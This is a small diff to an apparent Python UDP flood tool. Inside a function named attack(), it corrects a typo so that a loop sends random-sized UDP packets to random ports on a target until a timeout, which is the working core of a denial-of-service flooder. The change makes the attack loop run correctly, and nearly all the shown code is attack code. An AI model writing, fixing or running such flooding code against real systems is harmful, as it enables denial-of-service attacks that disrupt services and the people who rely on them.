@@ -16,7 +16,7 @@ def attack():
 		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 		while time.time() < timeout:
 			dport = random.randint(20,55500)
-			sock.sendto(bytes*random.randiny(5,15), (target, dport))
+			sock.sendto(bytes*random.randint(5,15), (target, dport))
 		return
 		sys.exit()
 	except:
